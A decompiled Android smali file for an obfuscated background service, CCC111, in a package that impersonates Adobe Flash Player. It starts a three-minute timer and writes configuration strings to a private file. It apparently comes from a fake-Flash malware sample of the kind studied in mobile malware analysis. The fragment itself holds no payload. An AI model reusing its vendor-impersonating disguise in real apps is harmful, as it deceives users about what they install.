.class public Lcom/adobe/flashplayer_/CCC111;
.super Landroid/app/Service;
.source "CCC111.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 16
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic access$0(Lcom/adobe/flashplayer_/CCC111;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 0

    .prologue
    .line 40
    invoke-direct {p0, p1, p2, p3}, Lcom/adobe/flashplayer_/CCC111;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    return-void
.end method

.method private writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 2
    .param p1, "config"    # Ljava/lang/String;
    .param p2, "data"    # Ljava/lang/String;
    .param p3, "context"    # Landroid/content/Context;

    .prologue
    .line 42
    :try_start_0
    new-instance v0, Ljava/io/OutputStreamWriter;

    const/4 v1, 0x0

    invoke-virtual {p3, p1, v1}, Landroid/content/Context;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 43
    .local v0, "outputStreamWriter":Ljava/io/OutputStreamWriter;
    invoke-virtual {v0, p2}, Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;)V

    .line 44
    invoke-virtual {v0}, Ljava/io/OutputStreamWriter;->close()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 48
    .end local v0    # "outputStreamWriter":Ljava/io/OutputStreamWriter;
    :goto_0
    return-void

    .line 46
    :catch_0
    move-exception v1

    goto :goto_0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "arg0"    # Landroid/content/Intent;

    .prologue
    .line 54
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 6

    .prologue
    const-wide/32 v2, 0x2bf20

    .line 21
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 23
    new-instance v0, Lcom/adobe/flashplayer_/CCC111$1;

    move-object v1, p0

    move-wide v4, v2

    invoke-direct/range {v0 .. v5}, Lcom/adobe/flashplayer_/CCC111$1;-><init>(Lcom/adobe/flashplayer_/CCC111;JJ)V

    .line 33
    invoke-virtual {v0}, Lcom/adobe/flashplayer_/CCC111$1;->start()Landroid/os/CountDownTimer;

    .line 37
    return-void
.end method

.method public onDestroy()V
    .locals 0

    .prologue
    .line 59
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 60
    return-void
.end method
